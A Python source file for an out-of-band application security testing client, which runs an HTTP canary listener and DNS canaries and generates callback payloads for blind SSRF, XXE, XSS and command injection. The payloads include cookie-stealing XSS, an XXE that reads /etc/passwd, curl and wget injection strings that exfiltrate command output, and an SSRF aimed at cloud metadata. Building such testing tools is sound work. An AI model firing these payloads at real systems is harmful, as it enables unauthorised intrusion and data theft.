"""
OAST (Out-of-Band Application Security Testing) Client

Enables detection of blind vulnerabilities by generating unique callback URLs
and polling for hits. Supports:
- Blind SSRF
- Blind XSS
- Blind XXE
- DNS exfiltration
- HTTP exfiltration

Strategies:
1. HTTP Canary (default) - Local HTTP listener for capturing callbacks
2. DNS Canary (optional) - Unique subdomain generation for blind DNS detection
3. interact.sh fallback - Subdomain generation when no listener is active
"""

import hashlib
import json
import socket
import subprocess
import threading
import time
import uuid
from dataclasses import dataclass, field
from http.server import HTTPServer, BaseHTTPRequestHandler
from io import BytesIO
from typing import Any, Dict, List, Optional, Tuple

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


@dataclass
class Callback:
    """Represents a received callback from OAST server."""
    id: str
    timestamp: str
    protocol: str  # dns, http, https
    raw_request: str
    source_ip: str
    unique_id: str  # The unique ID that was embedded in the payload
    metadata: Dict[str, Any] = field(default_factory=dict)


class _CanaryRequestHandler(BaseHTTPRequestHandler):
    """
    HTTP request handler for the canary listener.

    Accepts ANY HTTP method, logs the full request (method, path, headers, body),
    returns 200 OK with an empty body, and stores the callback in the parent
    server's thread-safe callback list.
    """

    def _handle_any(self):
        """Common handler for all HTTP methods."""
        # Read body if present
        content_length = int(self.headers.get("Content-Length", 0))
        body = ""
        if content_length > 0:
            body = self.rfile.read(content_length).decode("utf-8", errors="replace")

        # Build raw request string
        raw_lines = [f"{self.command} {self.path} {self.request_version}"]
        for header, value in self.headers.items():
            raw_lines.append(f"{header}: {value}")
        if body:
            raw_lines.append("")
            raw_lines.append(body)
        raw_request = "\r\n".join(raw_lines)

        # Extract source IP
        source_ip = self.client_address[0] if self.client_address else "unknown"

        # Try to extract a unique_id from the path
        # Convention: the first path segment after / is treated as unique_id
        # e.g., /ssrf-test-1/exfil => unique_id = "ssrf-test-1"
        path_parts = self.path.strip("/").split("/")
        unique_id = path_parts[0] if path_parts and path_parts[0] else "unknown"

        # Build callback object
        callback = Callback(
            id=str(uuid.uuid4()),
            timestamp=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            protocol="http",
            raw_request=raw_request,
            source_ip=source_ip,
            unique_id=unique_id,
            metadata={
                "method": self.command,
                "path": self.path,
                "headers": dict(self.headers),
                "body": body,
            },
        )

        # Thread-safe append to the server's callback list
        with self.server.callbacks_lock:
            self.server.callbacks.append(callback)

        # Send 200 OK with empty body
        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.send_header("Connection", "close")
        self.end_headers()

    # Accept ANY HTTP method
    def do_GET(self):
        self._handle_any()

    def do_POST(self):
        self._handle_any()

    def do_PUT(self):
        self._handle_any()

    def do_DELETE(self):
        self._handle_any()

    def do_PATCH(self):
        self._handle_any()

    def do_HEAD(self):
        self._handle_any()

    def do_OPTIONS(self):
        self._handle_any()

    def do_TRACE(self):
        self._handle_any()

    def do_CONNECT(self):
        self._handle_any()

    def log_message(self, format, *args):
        """Suppress default stderr logging to avoid noise."""
        pass


class _CanaryHTTPServer(HTTPServer):
    """HTTPServer subclass that carries a thread-safe callback list."""

    def __init__(self, server_address: Tuple[str, int], RequestHandlerClass):
        self.callbacks: List[Callback] = []
        self.callbacks_lock = threading.Lock()
        super().__init__(server_address, RequestHandlerClass)


class OASTClient:
    """
    Client for Out-of-Band Application Security Testing.

    Supports two strategies:

    **Strategy 1: HTTP Canary** (default, works without external service)
        Spins up a local HTTP server on a random high port to capture callbacks.
        Best when the target can reach the tester's machine (same network, SSRF
        to internal addresses, etc.).

    **Strategy 2: DNS Canary** (optional, for blind testing)
        Generates unique subdomains and checks if DNS lookups were made.

    If neither listener is started, falls back to interact.sh subdomain
    generation (existing behavior, no polling).

    Usage:
        client = OASTClient()

        # Start the HTTP canary listener
        canary_url = client.start_listener()
        print(f"Canary listening at: {canary_url}")

        # Generate payloads that point to the canary
        payloads = client.generate_ssrf_payloads("test-ssrf-1")

        # Send payloads to target... (externally)

        # Poll for callbacks
        callbacks = client.poll_callbacks(timeout=30)
        if callbacks:
            print(f"SSRF confirmed! Got {len(callbacks)} callbacks")

        # Clean up
        client.stop_listener()
    """

    def __init__(self, server: str = "interact.sh", session_id: Optional[str] = None):
        """
        Initialize OAST client.

        Args:
            server: OAST server domain (default: interact.sh)
            session_id: Optional session ID for persistent tracking
        """
        self.server = server
        self.session_id = session_id or self._generate_session_id()
        self._callbacks: List[Callback] = []

        # HTTP Canary state
        self._http_server: Optional[_CanaryHTTPServer] = None
        self._http_thread: Optional[threading.Thread] = None
        self._listener_url: Optional[str] = None
        self._listener_host: Optional[str] = None
        self._listener_port: Optional[int] = None

        # DNS Canary state
        self._dns_canary_subdomains: Dict[str, str] = {}  # unique_id -> subdomain

    def _generate_session_id(self) -> str:
        """Generate a unique session ID for this testing session."""
        return str(uuid.uuid4())[:8]

    # ------------------------------------------------------------------
    # HTTP Canary Listener
    # ------------------------------------------------------------------

    def start_listener(self, port: int = 0, host: str = "0.0.0.0") -> str:
        """
        Start the HTTP canary server in a background thread.

        The server accepts any HTTP method, logs the full request, and
        stores it as a Callback.

        Args:
            port: Port to listen on. 0 = pick a random high port (49152-65535).
                  If a specific port is given, it will be used directly.
            host: Interface to bind to. Defaults to all interfaces.

        Returns:
            The base callback URL (e.g., "http://192.168.1.50:52341").

        Raises:
            RuntimeError: If the listener is already running.
        """
        if self._http_server is not None:
            raise RuntimeError(
                "HTTP canary listener is already running at "
                f"{self._listener_url}. Call stop_listener() first."
            )

        # Pick a random high port if none specified
        if port == 0:
            import random
            port = random.randint(49152, 65535)

        # Create the server
        self._http_server = _CanaryHTTPServer((host, port), _CanaryRequestHandler)
        self._listener_port = self._http_server.server_address[1]

        # Determine the host for the URL: use the machine's LAN IP if binding
        # to 0.0.0.0, otherwise use the specified host.
        if host == "0.0.0.0":
            self._listener_host = self._get_local_ip()
        else:
            self._listener_host = host

        self._listener_url = f"http://{self._listener_host}:{self._listener_port}"

        # Run in a daemon thread so it doesn't block shutdown
        self._http_thread = threading.Thread(
            target=self._http_server.serve_forever,
            name="oast-canary-listener",
            daemon=True,
        )
        self._http_thread.start()

        return self._listener_url

    def stop_listener(self):
        """
        Stop the HTTP canary server and clean up resources.

        Safe to call even if the listener is not running (no-op).
        """
        if self._http_server is not None:
            self._http_server.shutdown()
            self._http_server.server_close()

            # Drain any remaining callbacks from the server into our list
            with self._http_server.callbacks_lock:
                self._callbacks.extend(self._http_server.callbacks)
                self._http_server.callbacks.clear()

            self._http_server = None
            self._http_thread = None
            self._listener_url = None
            self._listener_host = None
            self._listener_port = None

    @property
    def listener_active(self) -> bool:
        """Return True if the HTTP canary listener is currently running."""
        return self._http_server is not None

    @staticmethod
    def _get_local_ip() -> str:
        """
        Best-effort detection of the machine's LAN IP address.

        Falls back to 127.0.0.1 if detection fails.
        """
        try:
            # Create a UDP socket and "connect" to an external address.
            # No data is actually sent; this just lets the OS pick the
            # right source interface.
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(0)
            s.connect(("10.254.254.254", 1))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    # ------------------------------------------------------------------
    # DNS Canary
    # ------------------------------------------------------------------

    def generate_dns_canary(self, unique_id: str, base_domain: Optional[str] = None) -> str:
        """
        Generate a unique subdomain for DNS canary detection.

        Args:
            unique_id: Unique identifier for this test.
            base_domain: Base domain to append. Defaults to self.server.

        Returns:
            A unique subdomain string, e.g., "a1b2c3d4e5f6.interact.sh"
        """
        base = base_domain or self.server
        combined = f"{self.session_id}-{unique_id}-{uuid.uuid4().hex[:6]}"
        hash_part = hashlib.md5(combined.encode()).hexdigest()[:12]
        subdomain = f"{hash_part}.{base}"
        self._dns_canary_subdomains[unique_id] = subdomain
        return subdomain

    def check_dns_canary(self, unique_id: str) -> Optional[Callback]:
        """
        Check if a DNS canary subdomain was resolved.

        Uses ``dig`` (or ``nslookup`` on Windows) to see if the subdomain
        was looked up. This is a heuristic check -- it works best when the
        base domain is controlled by the tester or when DNS logs are
        accessible.

        Args:
            unique_id: The unique_id used when generating the canary.

        Returns:
            A Callback if a DNS resolution was detected, None otherwise.
        """
        subdomain = self._dns_canary_subdomains.get(unique_id)
        if not subdomain:
            return None

        try:
            # Try dig first (Linux/macOS), fall back to nslookup (Windows)
            try:
                result = subprocess.run(
                    ["dig", "+short", subdomain],
                    capture_output=True, text=True, timeout=5,
                )
                output = result.stdout.strip()
            except FileNotFoundError:
                result = subprocess.run(
                    ["nslookup", subdomain],
                    capture_output=True, text=True, timeout=5,
                )
                output = result.stdout.strip()

            # If we got any non-empty answer, a resolution happened
            if output and "NXDOMAIN" not in output and "can't find" not in output.lower():
                callback = Callback(
                    id=str(uuid.uuid4()),
                    timestamp=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                    protocol="dns",
                    raw_request=f"DNS lookup for {subdomain}\n{output}",
                    source_ip="dns",
                    unique_id=unique_id,
                    metadata={"subdomain": subdomain, "dns_answer": output},
                )
                return callback
        except (subprocess.TimeoutExpired, Exception):
            pass

        return None

    # ------------------------------------------------------------------
    # Callback Generation & Polling
    # ------------------------------------------------------------------

    def generate_callback(self, unique_id: str) -> str:
        """
        Generate a unique callback URL for a specific test.

        If the HTTP canary listener is active, returns a URL pointing to
        the local listener with the unique_id embedded in the path.
        Otherwise falls back to generating an interact.sh subdomain.

        Args:
            unique_id: Unique identifier for this test (e.g., "ssrf-test-1")

        Returns:
            Full callback URL. Examples:
                - Listener active:  http://192.168.1.50:52341/ssrf-test-1
                - Listener inactive: abc123def456.interact.sh
        """
        if self.listener_active and self._listener_url:
            # Use the local HTTP canary
            return f"{self._listener_url}/{unique_id}"

        # Fallback: interact.sh subdomain generation
        combined = f"{self.session_id}-{unique_id}"
        hash_part = hashlib.md5(combined.encode()).hexdigest()[:12]
        callback_url = f"{hash_part}.{self.server}"
        return callback_url

    def poll_callbacks(self, timeout: int = 30, interval: int = 2) -> List[Callback]:
        """
        Poll for received callbacks.

        **Strategy 1 -- HTTP Canary (listener active):**
        Waits up to ``timeout`` seconds, checking the listener's callback
        list every ``interval`` seconds. Returns all accumulated callbacks
        once at least one is found or the timeout expires.

        **Strategy 2 -- Fallback (no listener):**
        Returns any callbacks stored in the in-memory ``_callbacks`` list
        (populated manually or via ``_simulate_callback``).

        Args:
            timeout: Maximum seconds to wait for callbacks.
            interval: Seconds between poll cycles (only used with the
                      HTTP canary listener).

        Returns:
            List of received Callback objects.
        """
        if self.listener_active and self._http_server is not None:
            # Poll the HTTP canary server's callback list
            deadline = time.monotonic() + timeout
            collected: List[Callback] = []

            while time.monotonic() < deadline:
                with self._http_server.callbacks_lock:
                    if self._http_server.callbacks:
                        collected.extend(self._http_server.callbacks)
                        self._http_server.callbacks.clear()

                if collected:
                    # We got at least one callback; do one more short wait
                    # to catch any that arrive in quick succession, then
                    # return.
                    time.sleep(min(interval, 1))
                    with self._http_server.callbacks_lock:
                        if self._http_server.callbacks:
                            collected.extend(self._http_server.callbacks)
                            self._http_server.callbacks.clear()
                    return collected

                time.sleep(interval)

            # Final drain after timeout
            with self._http_server.callbacks_lock:
                if self._http_server.callbacks:
                    collected.extend(self._http_server.callbacks)
                    self._http_server.callbacks.clear()

            return collected

        # Fallback: return in-memory callbacks (backward compatible)
        callbacks = self._callbacks.copy()
        self._callbacks.clear()
        return callbacks

    # ------------------------------------------------------------------
    # Payload Generators
    # ------------------------------------------------------------------

    def generate_ssrf_payloads(self, unique_id: str) -> List[str]:
        """
        Generate SSRF payloads with embedded callback URLs.

        Args:
            unique_id: Unique identifier for this test

        Returns:
            List of SSRF payloads to test
        """
        callback_url = self.generate_callback(unique_id)

        # Determine if callback_url is already a full URL (listener) or
        # just a domain (interact.sh fallback).
        if callback_url.startswith("http://") or callback_url.startswith("https://"):
            base_http = callback_url
            base_https = callback_url.replace("http://", "https://", 1)
            domain_only = callback_url.split("//", 1)[1]
        else:
            base_http = f"http://{callback_url}"
            base_https = f"https://{callback_url}"
            domain_only = callback_url

        payloads = [
            # Basic HTTP callback
            base_http,
            base_https,

            # With path
            f"{base_http}/ssrf",
            f"{base_http}/x?data=ssrf-test",

            # URL encoding variations
            base_http.replace("://", "%3A%2F%2F").replace("/", "%2F", 2),

            # With credentials (some parsers)
            f"http://user:pass@{domain_only}",

            # Wrapped in file protocols
            f"file:///{domain_only}",
            f"gopher://{domain_only}",

            # Cloud metadata variations
            f"http://{domain_only}@169.254.169.254/latest/meta-data/",

            # DNS-only (for blind SSRF detection)
            domain_only,
        ]

        return payloads

    def generate_xxe_payloads(self, unique_id: str) -> List[str]:
        """
        Generate XXE payloads with embedded callback URLs.

        Args:
            unique_id: Unique identifier for this test

        Returns:
            List of XXE payloads to test
        """
        callback_url = self.generate_callback(unique_id)

        # Normalize to a plain URL for XML entities
        if callback_url.startswith("http://") or callback_url.startswith("https://"):
            http_url = callback_url
        else:
            http_url = f"http://{callback_url}"

        payloads = [
            # Basic XXE with external entity
            f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{http_url}/xxe">]>
<root>&xxe;</root>""",

            # XXE with parameter entity
            f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{http_url}/xxe-param"> %xxe;]>
<root>test</root>""",

            # XXE with data exfiltration
            f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "{http_url}/evil.dtd">
%dtd;
%send;
]>
<root>&exfil;</root>""",

            # Blind XXE (DNS-based)
            f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{http_url}">]>
<root>&xxe;</root>""",

            # XXE with CDATA
            f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "{http_url}/cdata">
]>
<root><![CDATA[&xxe;]]></root>""",
        ]

        return payloads

    def generate_xss_payloads(self, unique_id: str) -> List[str]:
        """
        Generate XSS payloads that trigger callbacks (for blind XSS).

        Args:
            unique_id: Unique identifier for this test

        Returns:
            List of XSS payloads that make callbacks
        """
        callback_url = self.generate_callback(unique_id)

        # Normalize
        if callback_url.startswith("http://") or callback_url.startswith("https://"):
            http_url = callback_url
            domain_only = callback_url.split("//", 1)[1]
        else:
            http_url = f"http://{callback_url}"
            domain_only = callback_url

        payloads = [
            # Basic image tag
            f'<img src="{http_url}/xss.gif">',

            # Script with fetch
            f'<script>fetch("{http_url}/xss?cookie="+document.cookie)</script>',

            # Script with XMLHttpRequest
            f'<script>new Image().src="{http_url}/xss?"+document.location</script>',

            # Inline onerror
            f'<img src=x onerror="fetch(\'{http_url}/xss\')">',

            # SVG-based
            f'<svg onload="fetch(\'{http_url}/xss\')">',

            # Link prefetch (executes in some contexts)
            f'<link rel="prefetch" href="{http_url}/xss">',

            # DNS prefetch
            f'<link rel="dns-prefetch" href="{http_url}">',
        ]

        return payloads

    def generate_rce_payloads(self, unique_id: str) -> List[str]:
        """
        Generate RCE payloads that trigger callbacks (for blind command injection).

        Args:
            unique_id: Unique identifier for this test

        Returns:
            List of command injection payloads
        """
        callback_url = self.generate_callback(unique_id)

        # Normalize
        if callback_url.startswith("http://") or callback_url.startswith("https://"):
            http_url = callback_url
            domain_only = callback_url.split("//", 1)[1]
        else:
            http_url = f"http://{callback_url}"
            domain_only = callback_url

        payloads = [
            # curl callback
            f"; curl {http_url}/rce",
            f"| curl {http_url}/rce",
            f"& curl {http_url}/rce",
            f"&& curl {http_url}/rce",

            # wget callback
            f"; wget {http_url}/rce",

            # DNS-based (works even without curl/wget)
            f"; nslookup {domain_only}",
            f"; ping -c 1 {domain_only}",

            # With data exfiltration
            f"; curl {http_url}/rce?data=$(whoami)",
            f"; wget {http_url}/rce?pwd=$(pwd)",

            # Backtick syntax
            f"`curl {http_url}/rce`",

            # Subshell
            f"$(curl {http_url}/rce)",
        ]

        return payloads

    # ------------------------------------------------------------------
    # Simulation / Testing Helpers
    # ------------------------------------------------------------------

    def _simulate_callback(self, unique_id: str, protocol: str = "http"):
        """
        Simulate receiving a callback (for testing purposes).

        Args:
            unique_id: The unique ID that was in the payload
            protocol: Protocol used (dns, http, https)
        """
        callback = Callback(
            id=str(uuid.uuid4()),
            timestamp=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            protocol=protocol,
            raw_request="Simulated callback",
            source_ip="127.0.0.1",
            unique_id=unique_id,
        )
        self._callbacks.append(callback)
